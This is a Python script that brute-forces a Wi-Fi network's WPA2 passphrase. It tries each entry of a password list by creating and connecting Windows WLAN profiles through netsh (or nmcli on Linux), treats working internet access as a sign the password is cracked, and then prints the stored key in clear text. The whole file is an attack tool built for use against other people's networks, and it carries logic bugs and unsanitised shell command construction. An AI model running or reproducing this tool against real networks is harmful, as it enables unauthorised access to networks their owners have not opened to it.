import os
import platform
import time
import requests


url = "http://www.python.org"
timeout = 5
def createNewConnection(name, SSID, key):
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>"""+name+"""</name>
    <SSIDConfig>
        <SSID>
            <name>"""+SSID+"""</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>"""+key+"""</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    if platform.system() == "Windows":
        command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
        with open(name+".xml", 'w') as file:
            file.write(config)
    elif platform.system() == "Linux":
        command = "nmcli dev wifi connect '"+SSID+"' password '"+key+"'"
    os.system(command)
    if platform.system() == "Windows":
        os.remove(name+".xml")

def connect(name, SSID):
    os.system("netsh wlan connect name=\""+name+"\" ssid=\""+SSID+"\" interface=Wi-Fi")

def displayAvailableNetworks():
       os.system("netsh wlan show networks interface=Wi-Fi")

print("[LOADING] Searching if connected to any network")

try:
    request = requests.get(url, timeout=timeout)
    print("[-] Please disconnect your internet for this operation to work, try again later"), exit()
    
except (requests.ConnectionError, requests.Timeout) as exception:
    print("[LOADING] Loading program..."), time.sleep(1)

connected = True
while connected:
    try:
        displayAvailableNetworks()
        WIFI = input("WIFI Name: ")
        with open("passwords.txt", "r") as f:
            for line in f:
                words = line.split()
                if words:
                    print(f"Password: {words[0]}")
                    
                    createNewConnection(WIFI, WIFI, words[0])
                    connect(WIFI, WIFI)

                    try:
                        request = requests.get(url, timeout=timeout)
                        connected = False
                        choice = input(f"[+] The password might have been cracked, are you connected to {WIFI} (y/N) ? ")
                        if choice == "y":
                            print("\n[EXITING] Operation canceled")
                            exit()
                        elif choice == "n":
                            print("\n[-] Operation continues\n")
                        
                    except (requests.ConnectionError, requests.Timeout) as exception:
                        print("[LOADING] Loading program..."), time.sleep(1)

        print("[+] Operation complete")
        choice = input("See WIFI Information (y/N) ? ")
        if choice == "y" or "Y":
            print(f"[LOADING] Searching for {WIFI} network")
            time.sleep(1)
            os.system(f'netsh wlan show profile name="{WIFI}" key=clear')
            exit()
        elif choice == "n" or "N":
            print("\n[EXITING] Exiting program...")
            time.sleep(2)
            exit()

    except KeyboardInterrupt as e:
        print("\n[[EXITING] Aborting program...")
        exit()